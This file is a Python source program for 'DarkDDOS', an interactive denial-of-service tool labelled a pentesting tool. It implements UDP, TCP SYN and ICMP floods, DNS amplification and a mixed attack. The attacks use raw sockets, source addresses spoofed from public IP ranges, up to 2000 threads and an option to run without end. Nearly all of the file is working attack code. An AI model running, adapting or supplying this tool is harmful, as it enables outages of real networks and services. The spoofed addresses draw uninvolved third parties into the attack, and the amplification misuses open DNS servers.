import socket
import os
import random
import threading
import time
import sys
import csv
import logging
import signal
import platform
from concurrent.futures import ThreadPoolExecutor
import pathlib
import struct
import traceback

try:
    from faker import Faker
except ImportError:
    print("Error: Faker is not installed. Run 'pip install faker'")
    sys.exit(1)


script_dir = str(pathlib.Path(__file__).parent)
log_file = os.path.join(script_dir, f"ddarkddos_log_{time.strftime('%Y%m%d_%H%M%S')}.txt")
packet_log_file = os.path.join(script_dir, f"ddarkddos_packet_log_{time.strftime('%Y%m%d_%H%M%S')}.csv")


try:
    with open(os.path.join(script_dir, "test_write.txt"), "w") as f:
        f.write("test")
    os.remove(os.path.join(script_dir, "test_write.txt"))
except Exception as e:
    print(f"Error: Cannot write to directory {script_dir}: {e}")
    sys.exit(1)


logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

packet_log_lock = threading.Lock()

def init_packet_log():
    try:
        with open(packet_log_file, 'w', newline='') as f:
            writer = csv.writer(f)
            writer.writerow(['Timestamp', 'Thread_ID', 'Attack_Type', 'Target_IP', 'Target_Port', 'Packet_Size', 'Status', 'Latency_ms', 'Spoofed_IP'])
        logging.debug("Packet log initialized")
    except Exception as e:
        logging.error(f"Failed to initialize packet log: {e}")
        raise

class DarkDoS:
    def __init__(self):
        print("DEBUG: Initializing DarkDoS...")
        logging.debug("Initializing DarkDoS")
        self.running = False
        self.executor = None
        self.thread_count = 100
        self.packet_rate = 1000
        self.duration = 0
        self.packets_sent = 0
        self.successful_packets = 0
        self.failed_packets = 0
        self.total_latency = 0
        self.use_spoofing = False
        try:
            self.fake = Faker()
            print("DEBUG: Faker initialized")
            logging.debug("Faker initialized")
        except Exception as e:
            logging.error(f"Failed to initialize Faker: {e}")
            raise
        self.attack_methods = {
            '1': ('UDP Flood', self.udp_flood),
            '2': ('TCP SYN Flood', self.syn_flood),
            '3': ('ICMP Flood', self.icmp_flood),
            '4': ('DNS Amplification', self.dns_amplification),
            '5': ('Mixed Attack', self.mixed_attack)
        }
        self.lock = threading.Lock()
        print("DEBUG: Generating IP pool...")
        logging.debug("Generating IP pool")
        try:
            self.ip_pool = self._generate_ip_pool()
            print(f"DEBUG: IP pool generated with {len(self.ip_pool)} IPs")
            logging.debug(f"IP pool generated with {len(self.ip_pool)} IPs")
        except Exception as e:
            logging.error(f"Failed to generate IP pool: {e}")
            raise
        try:
            init_packet_log()
            print("DEBUG: Packet log initialized")
        except Exception as e:
            logging.error(f"Failed to initialize packet log: {e}")
            raise
        signal.signal(signal.SIGINT, self.signal_handler)
        if platform.system() == "Windows" and not self.is_admin():
            print("Warning: This script requires Administrator privileges for raw socket attacks.")
        print("DEBUG: DarkDoS initialization complete")
        logging.debug("DarkDoS initialization complete")

    def _generate_ip_pool(self):
        logging.debug("Starting IP pool generation")
        public_ranges = [
            ("1.0.0.0", "9.255.255.255"),
            ("11.0.0.0", "126.255.255.255"),
            ("128.0.0.0", "169.253.255.255"),
            ("169.255.0.0", "172.15.255.255"),
            ("172.32.0.0", "191.255.255.255"),
            ("192.0.2.0", "192.167.255.255"),
            ("192.169.0.0", "198.17.255.255"),
            ("198.20.0.0", "223.255.255.255")
        ]
        ip_pool = []
        max_ips_per_range = 10000
        try:
            for start, end in public_ranges:
                logging.debug(f"Processing range {start} to {end}")
                start_int = int(''.join([bin(int(x)+256)[3:] for x in start.split('.')]), 2)
                end_int = int(''.join([bin(int(x)+256)[3:] for x in end.split('.')]), 2)
                range_size = end_int - start_int + 1
                if range_size > max_ips_per_range:
                    sampled_ips = random.sample(range(start_int, end_int + 1), max_ips_per_range)
                    ip_pool.extend(sampled_ips)
                else:
                    ip_pool.extend(range(start_int, end_int + 1))
                logging.debug(f"Added IPs from range {start} to {end}")
            return ip_pool
        except Exception as e:
            logging.error(f"Error in IP pool generation: {e}")
            raise

    def generate_spoofed_ip(self):
        try:
            ip_int = random.choice(self.ip_pool)
            ip_str = f"{(ip_int >> 24) & 255}.{(ip_int >> 16) & 255}.{(ip_int >> 8) & 255}.{ip_int & 255}"
            reserved_prefixes = ("0.", "10.", "127.", "169.254.", "192.168.", "224.", "255.")
            if any(ip_str.startswith(prefix) for prefix in reserved_prefixes):
                return self.generate_spoofed_ip()
            return ip_str
        except Exception as e:
            logging.error(f"Failed to generate spoofed IP: {e}")
            return "1.1.1.1"

    def is_admin(self):
        if platform.system() == "Windows":
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        return os.geteuid() == 0 if hasattr(os, 'geteuid') else False

    def signal_handler(self, sig, frame):
        logging.info("Ctrl+C received, initiating shutdown")
        print("\nCtrl+C detected, stopping attack...")
        self.stop_attack()

    def show_banner(self):
        print("DarkDDOS - Pentesting Tool")
        print("--------------------------\n")
        print("Note: Run as Administrator for raw socket attacks.")
        print(f"Logs saved to: {log_file}")
        print(f"Packet logs saved to: {packet_log_file}")
        logging.debug("Banner displayed")

    def get_parameters(self):
        print("DEBUG: Getting parameters...")
        logging.debug("Getting parameters")
        while True:
            self.target_ip = input("Enter target IP: ").strip()
            try:
                socket.inet_aton(self.target_ip)
                if not self.test_reachability(self.target_ip):
                    print("Warning: Target IP may not be reachable.")
                break
            except socket.error:
                print("Invalid IP address. Try again.")

        if self.attack_choice == '4':
            while True:
                self.dns_server = input("Enter vulnerable DNS server IP: ").strip()
                try:
                    socket.inet_aton(self.dns_server)
                    break
                except socket.error:
                    print("Invalid DNS server IP. Try again.")

        if self.attack_choice in ['1', '2', '4']:
            while True:
                try:
                    self.target_port = int(input("Enter target port [1-65535]: ").strip())
                    if 1 <= self.target_port <= 65535:
                        break
                    print("Port must be between 1 and 65535.")
                except ValueError:
                    print("Invalid port. Enter a number.")

        if self.attack_choice == '1':
            self.use_spoofing = input("Enable IP spoofing for UDP flood? (y/n, default n): ").strip().lower() == 'y'
            print(f"UDP flood will {'use spoofed IPs' if self.use_spoofing else 'use host IP'}")

        while True:
            try:
                threads = input(f"Enter number of threads [1-2000] (default {self.thread_count}): ").strip() or str(self.thread_count)
                self.thread_count = max(1, min(2000, int(threads)))
                break
            except ValueError:
                print("Invalid thread count. Enter a number.")

        if self.attack_choice in ['1', '2', '3', '5']:
            while True:
                try:
                    size = input("Enter packet size [1-65500] (default 1024): ").strip() or "1024"
                    self.packet_size = max(1, min(65500, int(size)))
                    if self.attack_choice == '3' and self.packet_size > 1472:
                        print("ICMP packet size capped at 1472 bytes.")
                        self.packet_size = min(self.packet_size, 1472)
                    break
                except ValueError:
                    print("Invalid packet size. Enter a number.")

        while True:
            try:
                rate = input("Enter packets per second per thread [1-10000] (default 1000): ").strip() or "1000"
                self.packet_rate = max(1, min(10000, int(rate)))
                break
            except ValueError:
                print("Invalid packet rate. Enter a number.")

        while True:
            try:
                duration = input("Enter attack duration in seconds (0 for infinite, default 0): ").strip() or "0"
                self.duration = max(0, int(duration))
                break
            except ValueError:
                print("Invalid duration. Enter a number.")

        print(f"\nAttack Configuration:")
        print(f"Method: {self.attack_methods[self.attack_choice][0]}")
        print(f"Target: {self.target_ip}")
        if hasattr(self, 'target_port'):
            print(f"Port: {self.target_port}")
        if hasattr(self, 'dns_server'):
            print(f"DNS Server: {self.dns_server}")
        print(f"Threads: {self.thread_count}")
        print(f"Packet size: {self.packet_size if hasattr(self, 'packet_size') else 'N/A'} bytes")
        print(f"Packet rate: {self.packet_rate} pps/thread")
        print(f"Duration: {'Infinite' if self.duration == 0 else f'{self.duration} seconds'}\n")
        logging.debug("Parameters collected")

    def test_reachability(self, target_ip):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(1)
            s.sendto(b"test", (target_ip, 80))
            s.close()
            return True
        except Exception as e:
            logging.error(f"Reachability test failed: {e}")
            return False

    def calculate_checksum(self, data):
        checksum = 0
        if len(data) % 2:
            data += b'\x00'
        for i in range(0, len(data), 2):
            word = (data[i] << 8) + data[i + 1]
            checksum += word
        checksum = (checksum >> 16) + (checksum & 0xffff)
        checksum += (checksum >> 16)
        return ~checksum & 0xffff

    def build_udp_packet(self, src_ip, dst_ip, src_port, dst_port, payload):
        ip_header = struct.pack('!BBHHHBBH4s4s',
            69, 0, 20 + 8 + len(payload), 0, 64, 17, 0, 0,
            socket.inet_aton(src_ip), socket.inet_aton(dst_ip))
        
        pseudo_header = struct.pack('!4s4sBBH',
            socket.inet_aton(src_ip), socket.inet_aton(dst_ip),
            0, 17, 8 + len(payload))
        udp_header = struct.pack('!HHHH',
            src_port, dst_port, 8 + len(payload), 0)
        checksum_data = pseudo_header + udp_header + payload
        udp_checksum = self.calculate_checksum(checksum_data)
        udp_header = struct.pack('!HHHH',
            src_port, dst_port, 8 + len(payload), udp_checksum)
        
        return ip_header + udp_header + payload

    def udp_flood(self, thread_id):
        try:
            start_time = time.time()
            packets_per_thread = 0
            successful = 0
            failed = 0
            thread_latency = 0
            interval = 1.0 / max(self.packet_rate, 1)

            if self.use_spoofing:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                if platform.system() == "Windows":
                    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            else:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.setblocking(False)

            while self.running and (self.duration == 0 or time.time() - start_time < self.duration):
                try:
                    start = time.time()
                    target_port = self.target_port + random.randint(-10, 10)
                    target_port = max(1, min(65535, target_port))
                    packet_size = self.packet_size + random.randint(-100, 100)
                    packet_size = max(1, min(65500, packet_size))
                    payload = os.urandom(packet_size - 28)

                    if self.use_spoofing:
                        source_ip = self.generate_spoofed_ip()
                        src_port = random.randint(1024, 65535)
                        packet = self.build_udp_packet(source_ip, self.target_ip, src_port, target_port, payload)
                        s.sendto(packet, (self.target_ip, 0))
                    else:
                        s.sendto(payload, (self.target_ip, target_port))
                        source_ip = None

                    elapsed = time.time() - start
                    latency = elapsed * 1000
                    with self.lock:
                        self.packets_sent += 1
                        self.successful_packets += 1
                        self.total_latency += latency
                        successful += 1
                    self.log_packet(thread_id, 'UDP', self.target_ip, target_port, packet_size, 'Success', latency, source_ip)
                    packets_per_thread += 1
                except (BlockingIOError, OSError) as e:
                    with self.lock:
                        self.packets_sent += 1
                        self.failed_packets += 1
                        failed += 1
                    self.log_packet(thread_id, 'UDP', self.target_ip, target_port, packet_size, f'Failed: {str(e)}', source_ip)
                    logging.error(f"Thread {thread_id} UDP Flood {'(spoofed)' if self.use_spoofing else '(non-spoofed)'} error: {e}")
                if not self.running:
                    break
                time.sleep(max(0, interval - (time.time() - start)))
            s.close()
            logging.info(f"Thread {thread_id} UDP summary: {packets_per_thread} packets, {successful} successful, {failed} failed, avg latency {thread_latency/packets_per_thread:.2f}ms" if packets_per_thread > 0 else f"Thread {thread_id} UDP summary: No packets sent")
        except Exception as e:
            logging.error(f"Thread {thread_id} UDP setup error: {e}")

    def syn_flood(self, thread_id):
        try:
            start_time = time.time()
            packets_per_thread = 0
            successful = 0
            failed = 0
            thread_latency = 0
            interval = 1.0 / max(self.packet_rate, 1)
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            if platform.system() == "Windows":
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

            while self.running and (self.duration == 0 or time.time() - start_time < self.duration):
                try:
                    start = time.time()
                    source_ip = self.generate_spoofed_ip()
                    src_port = random.randint(1024, 65535)
                    packet_size = self.packet_size + random.randint(-100, 100)
                    packet_size = max(1, min(65500, packet_size))
                    payload = os.urandom(max(0, packet_size - 40))
                    ip_header = struct.pack('!BBHHHBBH4s4s',
                        69, 0, 20 + 20 + len(payload), 0, 64, 6, 0, 0,
                        socket.inet_aton(source_ip), socket.inet_aton(self.target_ip))
                    tcp_header = struct.pack('!HHLLBBHHH',
                        src_port, self.target_port, random.randint(1000, 9000000), 0, 80, 2, 5840, 0, 0)
                    packet = ip_header + tcp_header + payload
                    s.sendto(packet, (self.target_ip, 0))
                    elapsed = time.time() - start
                    latency = elapsed * 1000
                    with self.lock:
                        self.packets_sent += 1
                        self.successful_packets += 1
                        self.total_latency += latency
                        successful += 1
                    self.log_packet(thread_id, 'TCP SYN', self.target_ip, self.target_port, packet_size, 'Success', latency, source_ip)
                    packets_per_thread += 1
                except Exception as e:
                    with self.lock:
                        self.packets_sent += 1
                        self.failed_packets += 1
                        failed += 1
                    self.log_packet(thread_id, 'TCP SYN', self.target_ip, self.target_port, packet_size, f'Failed: {str(e)}', source_ip)
                    logging.error(f"Thread {thread_id} SYN Flood error: {e}")
                if not self.running:
                    break
                time.sleep(max(0, interval - (time.time() - start)))
            s.close()
            logging.info(f"Thread {thread_id} SYN summary: {packets_per_thread} packets, {successful} successful, {failed} failed, avg latency {thread_latency/packets_per_thread:.2f}ms" if packets_per_thread > 0 else f"Thread {thread_id} SYN summary: No packets sent")
        except Exception as e:
            logging.error(f"Thread {thread_id} SYN setup error: {e}")

    def icmp_flood(self, thread_id):
        try:
            start_time = time.time()
            packets_per_thread = 0
            successful = 0
            failed = 0
            thread_latency = 0
            interval = 1.0 / max(self.packet_rate, 1)
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            if platform.system() == "Windows":
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

            while self.running and (self.duration == 0 or time.time() - start_time < self.duration):
                try:
                    start = time.time()
                    source_ip = self.generate_spoofed_ip()
                    packet_size = self.packet_size + random.randint(-100, 100)
                    packet_size = max(1, min(1472, packet_size))
                    payload = os.urandom(max(0, packet_size - 28))
                    ip_header = struct.pack('!BBHHHBBH4s4s',
                        69, 0, 20 + 8 + len(payload), 0, 64, 1, 0, 0,
                        socket.inet_aton(source_ip), socket.inet_aton(self.target_ip))
                    icmp_header = struct.pack('!BBHHH', 8, 0, 0, 0, 0)
                    packet = ip_header + icmp_header + payload
                    s.sendto(packet, (self.target_ip, 0))
                    elapsed = time.time() - start
                    latency = elapsed * 1000
                    with self.lock:
                        self.packets_sent += 1
                        self.successful_packets += 1
                        self.total_latency += latency
                        successful += 1
                    self.log_packet(thread_id, 'ICMP', self.target_ip, None, packet_size, 'Success', latency, source_ip)
                    packets_per_thread += 1
                except Exception as e:
                    with self.lock:
                        self.packets_sent += 1
                        self.failed_packets += 1
                        failed += 1
                    self.log_packet(thread_id, 'ICMP', self.target_ip, None, packet_size, f'Failed: {str(e)}', source_ip)
                    logging.error(f"Thread {thread_id} ICMP Flood error: {e}")
                if not self.running:
                    break
                time.sleep(max(0, interval - (time.time() - start)))
            s.close()
            logging.info(f"Thread {thread_id} ICMP summary: {packets_per_thread} packets, {successful} successful, {failed} failed, avg latency {thread_latency/packets_per_thread:.2f}ms" if packets_per_thread > 0 else f"Thread {thread_id} ICMP summary: No packets sent")
        except Exception as e:
            logging.error(f"Thread {thread_id} ICMP setup error: {e}")

    def dns_amplification(self, thread_id):
        try:
            start_time = time.time()
            packets_per_thread = 0
            successful = 0
            failed = 0
            interval = 1.0 / max(self.packet_rate, 1)
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            if platform.system() == "Windows":
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

            while self.running and (self.duration == 0 or time.time() - start_time < self.duration):
                try:
                    start = time.time()
                    source_ip = self.generate_spoofed_ip()
                    domain = self.fake.domain_name()
                    dns_query = (b'\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00' +
                                 bytes([len(x) for x in domain.split('.')]) + domain.encode() +
                                 b'\x00\x00\xff\x00\x01')
                    ip_header = struct.pack('!BBHHHBBH4s4s',
                        69, 0, 20 + 8 + len(dns_query), 0, 64, 17, 0, 0,
                        socket.inet_aton(source_ip), socket.inet_aton(self.dns_server))
                    udp_header = struct.pack('!HHHH',
                        random.randint(1024, 65535), 53, 8 + len(dns_query), 0)
                    packet = ip_header + udp_header + dns_query
                    s.sendto(packet, (self.dns_server, 0))
                    elapsed = time.time() - start
                    latency = elapsed * 1000
                    with self.lock:
                        self.packets_sent += 1
                        self.successful_packets += 1
                        successful += 1
                    self.log_packet(thread_id, 'DNS', self.target_ip, 53, len(dns_query), 'Success', latency, source_ip)
                    packets_per_thread += 1
                except Exception as e:
                    with self.lock:
                        self.packets_sent += 1
                        self.failed_packets += 1
                        failed += 1
                    self.log_packet(thread_id, 'DNS', self.target_ip, 53, len(dns_query), f'Failed: {str(e)}', source_ip)
                    logging.error(f"Thread {thread_id} DNS Amplification error: {e}")
                if not self.running:
                    break
                time.sleep(max(0, interval - (time.time() - start)))
            s.close()
            logging.info(f"Thread {thread_id} DNS summary: {packets_per_thread} packets, {successful} successful, {failed} failed")
        except Exception as e:
            logging.error(f"Thread {thread_id} DNS setup error: {e}")

    def mixed_attack(self, thread_id):
        try:
            start_time = time.time()
            attack_types = ['UDP', 'TCP SYN', 'ICMP']
            packets_per_thread = 0
            successful = 0
            failed = 0
            thread_latency = 0
            interval = 1.0 / max(self.packet_rate, 1)
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            if platform.system() == "Windows":
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

            while self.running and (self.duration == 0 or time.time() - start_time < self.duration):
                attack_type = random.choice(attack_types)
                try:
                    start = time.time()
                    source_ip = self.generate_spoofed_ip()
                    packet_size = self.packet_size + random.randint(-100, 100)
                    packet_size = max(1, min(65500, packet_size))
                    payload = os.urandom(max(0, packet_size - (28 if attack_type == 'ICMP' else 40)))
                    ip_header = struct.pack('!BBHHHBBH4s4s',
                        69, 0, 20 + (8 if attack_type == 'ICMP' else 20) + len(payload), 0, 64,
                        17 if attack_type == 'UDP' else 6 if attack_type == 'TCP SYN' else 1,
                        0, 0, socket.inet_aton(source_ip), socket.inet_aton(self.target_ip))
                    
                    if attack_type == 'UDP':
                        target_port = self.target_port + random.randint(-10, 10)
                        target_port = max(1, min(65535, target_port))
                        udp_header = struct.pack('!HHHH',
                            random.randint(1024, 65535), target_port, 8 + len(payload), 0)
                        packet = ip_header + udp_header + payload
                    elif attack_type == 'TCP SYN':
                        tcp_header = struct.pack('!HHLLBBHHH',
                            random.randint(1024, 65535), self.target_port, random.randint(1000, 9000000), 0, 80, 2, 5840, 0, 0)
                        packet = ip_header + tcp_header + payload
                    else:  
                        icmp_header = struct.pack('!BBHHH', 8, 0, 0, 0, 0)
                        packet = ip_header + icmp_header + payload

                    s.sendto(packet, (self.target_ip, 0))
                    elapsed = time.time() - start
                    latency = elapsed * 1000
                    with self.lock:
                        self.packets_sent += 1
                        self.successful_packets += 1
                        self.total_latency += latency
                        successful += 1
                    self.log_packet(thread_id, attack_type, self.target_ip, self.target_port if attack_type != 'ICMP' else None, packet_size, 'Success', latency, source_ip)
                    packets_per_thread += 1
                except Exception as e:
                    with self.lock:
                        self.packets_sent += 1
                        self.failed_packets += 1
                        failed += 1
                    self.log_packet(thread_id, attack_type, self.target_ip, self.target_port if attack_type != 'ICMP' else None, packet_size, f'Failed: {str(e)}', source_ip)
                    logging.error(f"Thread {thread_id} Mixed Attack ({attack_type}) error: {e}")
                if not self.running:
                    break
                time.sleep(max(0, interval - (time.time() - start)))
            s.close()
            logging.info(f"Thread {thread_id} Mixed summary: {packets_per_thread} packets, {successful} successful, {failed} failed, avg latency {thread_latency/packets_per_thread:.2f}ms" if packets_per_thread > 0 else f"Thread {thread_id} Mixed summary: No packets sent")
        except Exception as e:
            logging.error(f"Thread {thread_id} Mixed setup error: {e}")

    def log_packet(self, thread_id, attack_type, target_ip, target_port, packet_size, status, latency=None, spoofed_ip=None):
        with packet_log_lock:
            try:
                with open(packet_log_file, 'a', newline='') as f:
                    writer = csv.writer(f)
                    writer.writerow([
                        time.strftime('%Y-%m-%d %H:%M:%S'),
                        thread_id,
                        attack_type,
                        target_ip,
                        target_port or 'N/A',
                        packet_size,
                        status,
                        f"{latency:.2f}" if latency is not None else 'N/A',
                        spoofed_ip or 'N/A'
                    ])
            except Exception as e:
                logging.error(f"Failed to log packet: {e}")

    def progress_monitor(self):
        start_time = time.time()
        while self.running:
            with self.lock:
                elapsed = time.time() - start_time
                avg_latency = (self.total_latency / self.successful_packets) if self.successful_packets > 0 else 0
                sys.stdout.write(f"\rElapsed: {elapsed:.1f}s | Packets Sent: {self.packets_sent:,} | Successful: {self.successful_packets:,} | Failed: {self.failed_packets:,} | Avg Latency: {avg_latency:.2f}ms")
                sys.stdout.flush()
            time.sleep(1)
        print()

    def start_attack(self):
        print("DEBUG: Starting attack...")
        logging.debug("Starting attack")
        self.running = True
        self.packets_sent = 0
        self.successful_packets = 0
        self.failed_packets = 0
        self.total_latency = 0
        attack_func = self.attack_methods[self.attack_choice][1]
        
        print(f"\nStarting {self.attack_methods[self.attack_choice][0]} attack with {self.thread_count} threads...")
        print("Press Ctrl+C to stop\n")
        
        self.executor = ThreadPoolExecutor(max_workers=self.thread_count)
        for i in range(self.thread_count):
            self.executor.submit(attack_func, i)
        
        monitor = threading.Thread(target=self.progress_monitor)
        monitor.daemon = True
        monitor.start()

        try:
            self.executor.shutdown(wait=True)
        except KeyboardInterrupt:
            self.stop_attack()

    def stop_attack(self):
        print("DEBUG: Stopping attack...")
        logging.debug("Stopping attack")
        self.running = False
        print("\nStopping attack...")
        if self.executor:
            self.executor.shutdown(wait=False)
            logging.info("Executor shutdown initiated")
        avg_latency = (self.total_latency / self.successful_packets) if self.successful_packets > 0 else 0
        logging.info(f"Attack stopped. Total packets: {self.packets_sent}, Successful: {self.successful_packets}, Failed: {self.failed_packets}, Avg Latency: {avg_latency:.2f}ms")
        print(f"Attack stopped. Total packets: {self.packets_sent:,}, Successful: {self.successful_packets:,}, Failed: {self.failed_packets:,}, Avg Latency: {avg_latency:.2f}ms")
        print(f"Check logs at {log_file} and {packet_log_file}")

    def run(self):
        print("DEBUG: Entering run method...")
        logging.debug("Entering run method")
        self.show_banner()
        
        try:
            while True:
                print("\nAvailable Attack Methods:")
                for num, (name, _) in self.attack_methods.items():
                    print(f"{num}. {name}")
                
                self.attack_choice = input("\nSelect attack method (or 'exit' to quit): ").strip()
                logging.debug(f"Attack choice: {self.attack_choice}")
                
                if self.attack_choice in self.attack_methods:
                    self.get_parameters()
                    self.start_attack()
                elif self.attack_choice.lower() in ['exit', 'quit']:
                    break
                else:
                    print("Invalid choice. Try again.")
        except KeyboardInterrupt:
            print("\nExiting...")
            self.stop_attack()
        except Exception as e:
            logging.critical(f"Fatal error in run: {e}")
            print(f"Fatal error: {e}")
            traceback.print_exc()
        finally:
            if self.running:
                self.stop_attack()
        print("DEBUG: Exiting run method")
        logging.debug("Exiting run method")

if __name__ == "__main__":
    print("DEBUG: Starting script...")
    logging.debug("Starting script")
    try:
        darkdos = DarkDoS()
        print("DEBUG: DarkDoS object created")
        logging.debug("DarkDoS object created")
        darkdos.run()
        print("DEBUG: Script completed")
        logging.debug("Script completed")
    except Exception as e:
        logging.critical(f"Fatal error in main: {e}")
        print(f"Fatal error: {e}")
        traceback.print_exc()
        sys.exit(1)